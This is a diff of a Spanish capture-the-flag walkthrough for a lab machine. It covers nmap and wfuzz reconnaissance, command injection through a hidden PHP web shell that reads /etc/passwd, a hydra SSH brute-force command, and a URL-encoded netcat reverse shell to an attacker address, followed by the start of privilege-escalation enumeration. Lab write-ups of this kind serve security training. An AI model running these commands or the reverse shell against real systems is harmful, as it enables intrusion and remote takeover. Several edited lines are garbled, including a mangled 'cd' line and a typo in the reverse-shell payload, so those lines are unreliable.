@@ -6,9 +6,9 @@ ___
 
 #### FASE RECONOCIMIENTO
 
-1. **Escaneo**:
+1. Lo primero es comenzar con el **Escaneo**:
 
-1.1 Primero del _Objetivo_:
+1.1 del _Objetivo_:
 
 ```
 nmap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]
@@ -83,14 +83,14 @@ nmap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]
 		    * `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u "http://[IP]/hidden/.shell.php?FUZZ=id"`
                 * cmd 200 
 
-Haciendo distintas pruebas, vemos podemos **Inyectar Comandos del Sistema** a través del _Parámetro URL_. Este es nuestro camino.
+Haciendo distintas pruebas, vemos podemos **Inyectar Comandos del Sistema** a través del _Parámetro URL cmd_. Este es nuestro _Vector de Ataque_.
 
 ___
 
 #### FASE EXPLOTACION
 
 **Del Sistema**:
-Antes de probar nuestra WebShell, podemos intentar algunas cosas para  _Enumerar el Sistema_. A través del navegador podemos, por ejemplo:
+Antes de probar nuestra WebShell, podemos intentar algunas cosas para  _Enumerar el Sistema_. A través del navegador hacemos, por ejemplo:
 
 * _Enumerar Usuarios:_       
 	- http://[IP]/hidden/.shell.php?cmd=cat%20/etc/passwd
@@ -107,13 +107,13 @@ Antes de probar nuestra WebShell, podemos intentar algunas cosas para  _Enumerar
 * _Brutear Contraseñas_:
 	* hydra -L users.txt -P rockyou.txt ssh://[IP] -t 16 -V -u
 
-Ahora que ya probamos varias cosas sin resultados pasamos a intentar **Footholding** mediante nuestra _Reverse Shell_:
+Ahora que ya probamos varias cosas sin resultados, pasamos a intentar **Footholding del Sistema** inyectando una _Reverse Shell_:
 
 Nos ponemos a la escucha en nuestra máquina atacante con:
 
 * rlwrap nc -lnvp 6660
 
-Ahora lanzamos nuestra Revershell desde el navegador:
+Ahora corremos nuestra RevShell/WebShell desde el navegador:
 `/hidden/.shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i202%3E%261%7Cnc%20172.18.0.2%206660%20%3E%2Ftmp%2Ff`
 
 * `whoami` ==> `root`. Funcionó!
@@ -131,18 +131,17 @@ Ahora ya comprobamos que tenemos una PTY funcional.
 ___
 		 
 #### FASE POST-EXPLOTACIÓN (Elevar Privilegios)
-* Listar un poco a los usuarios:
+Ahora que ya tenemos acceso al sistema en un entorno más controlado y funcional pasamos a:  
+
+* Enumerar Home de Usuarios:
     * ls -Ral /home
         * negan
         * rick
         * wwdata
         * www-data
 
-* cd /home/www-data
-* ls -al
-* hijack.py
-* ls -l hijack.py
-    * -rwxr-xr-x 1 root root 111 Feb 11  2025 hijack.py
+Nuestro usuario (www-data) parece tener un script que podría ser explotable: . Vamos a nuestro /home con 
+* cd /home/www-data  2025 hijack.py
 
 ```
 cat hijack.py
